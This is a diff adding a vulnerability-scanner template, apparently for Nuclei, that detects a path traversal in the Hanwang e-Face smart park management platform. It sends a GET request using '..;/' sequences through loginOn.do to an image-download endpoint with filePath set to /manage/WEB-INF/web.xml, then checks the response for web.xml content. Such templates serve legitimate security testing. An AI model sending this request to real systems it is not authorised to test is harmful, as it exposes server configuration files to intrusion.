@@ -1,0 +1,25 @@
+id: poc-yaml-hw-e-face-pass-spmp-loginon-do-path-traversal
+info:
+  name: 汉王e脸通智慧园区管理平台 loginOn.do Path Traversal
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: directory-traversal
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/manage/login/loginOn.do/..;/..;/resourceUpload/imgDownload.do?filePath=/manage/WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "</web-app>"
+          - "<display-name>"
+          - "<listener>"
+      - type: word
+        part: header
+        words:
+          - "image"
